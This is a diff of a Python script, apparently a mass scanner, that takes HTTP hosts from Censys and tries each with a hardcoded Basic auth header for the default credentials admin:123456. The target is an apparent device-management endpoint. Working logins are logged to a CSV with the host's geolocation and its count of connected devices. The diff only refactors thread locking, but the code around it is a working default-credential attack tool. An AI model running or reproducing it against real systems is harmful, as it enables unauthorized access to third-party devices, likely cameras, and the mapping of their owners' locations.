@@ -36,12 +36,6 @@ def change_thread_count(change):
     global threads
     threads = threads + change
 
-@add_mutex("print_single")
-def print_single(server, status=False):
-    if status:
-        add_success()
-    print(f"[ \033[92m{success} \033[97m| \033[33m{failed} \033[97m| \033[91m{errors} \033[97m] http://\033[96m{server}\033[97m/")
-
 @add_mutex("success")
 def add_success():
     global success
@@ -58,17 +52,18 @@ def add_error():
     errors += 1
 
 
+@add_mutex("print_single")
+def print_single(server, status=False):
+    if status:
+        add_success()
+    print(f"[ \033[92m{success} \033[97m| \033[33m{failed} \033[97m| \033[91m{errors} \033[97m] http://\033[96m{server}\033[97m/")
 
 
-save_mutex = threading.Lock()
+@add_mutex("save")
 def save(server, code, count, source, city, country, country_code, long, lat):
-    save_mutex.acquire()
     split = server.split(":")
     with open('output.csv', 'a') as f:
         f.writelines(f"{split[0]},{split[1]},{code},{count},{source},{city},{country},{country_code},{long},{lat}\n")
-
-    save_mutex.release()
-    exit()
 
 def send_login_request(server, source, city, country, country_code, long, lat):
     global success, failed, request_count
@@ -81,8 +76,7 @@ def send_login_request(server, source, city, country, country_code, long, lat):
             try:
                 r = requests.get(f"http://{server}/Media/Device/getDevice?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
                 if r.status_code == 200:
-                    json = r.json()
-                    count = len(json["DeviceConfig"]["Devices"]["Device"])
+                    count = len(r.json()["DeviceConfig"]["Devices"]["Device"])
             except:
                 pass
 
@@ -102,8 +96,6 @@ def send_login_request(server, source, city, country, country_code, long, lat):
 def start_thread(*args):
     while threads >= config.MAX_THREADS:
         pass
-
-
     change_thread_count(1)
     threading.Thread(target=send_login_request, args=(*args,)).start()
 
@@ -129,10 +121,7 @@ if config.CENSYS:
             for service in server['services']:
                 if service['service_name'] != "HTTP":
                     continue
-
-
                 location = server["location"]
-
                 city = location["city"] if 'city' in location else 'N/A'
                 start_thread(f"{server['ip']}:{service['port']}", "CENSYS", city, location["country"], location["country_code"], location["coordinates"]["longitude"], location["coordinates"]["latitude"])
                 
